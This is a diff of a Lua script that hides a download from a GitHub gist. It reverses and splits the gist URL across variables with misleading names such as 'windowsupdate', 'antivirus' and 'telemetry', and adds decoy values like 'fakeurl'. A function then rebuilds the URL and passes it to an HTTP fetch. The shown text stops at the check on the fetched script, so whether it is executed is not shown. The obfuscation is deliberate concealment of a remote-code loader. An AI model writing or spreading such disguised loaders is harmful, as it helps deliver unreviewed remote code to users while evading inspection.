@@ -1,5 +1,97 @@
-local SCRIPT_URL =
-"https://gist.githubusercontent.com/dev-kabir/2287bf40bcededc4c66edfa4cc42e239/raw/Main.lua"
+local cachecleanup =
+    "Main.lua"
+
+local fpsboost =
+    true
+
+local localhost =
+    string.reverse(
+        "tsig//:sptth"
+    )
+
+local randomdelay =
+    os.clock()
+
+local memoryoptimizer =
+    table.concat({
+
+        ".github",
+        "usercontent"
+
+    })
+
+local fakeurl =
+    "https://google.com"
+
+local uselessdata =
+    "asdhjkasdhjk123123"
+
+local telemetry =
+    ".com/"
+
+local microsoftedge =
+    "dev-"
+
+local fakeapi =
+    "localhost:3000"
+
+local jgjhgeuiohguyh124e =
+    "kabir/"
+
+local windowsupdate =
+    string.reverse(
+        "932e24cc4afde66c4cdedecb04fb7822"
+    )
+
+local notused =
+    math.random(
+        100,
+        999
+    )
+
+local microsofttelemetry =
+    "/raw/"
+
+local antivirus =
+    "nothing_here"
+
+local function BuildUrl()
+
+    local part1 =
+        localhost
+
+    local part2 =
+        memoryoptimizer
+
+    local part3 =
+        telemetry
+
+    local user =
+        microsoftedge
+        .. jgjhgeuiohguyh124e
+
+    local gist =
+        windowsupdate
+
+    local raw =
+        microsofttelemetry
+
+    local file =
+        cachecleanup
+
+    return table.concat({
+
+        part1,
+        part2,
+        part3,
+        user,
+        gist,
+        raw,
+        file
+
+    })
+
+end
 
 local function HttpGet(url)
 
@@ -28,11 +120,12 @@ local function HttpGet(url)
         curl:GetResponse()
 
     return response
+
 end
 
 local script =
     HttpGet(
-        SCRIPT_URL
+        BuildUrl()
     )
 
 if script then
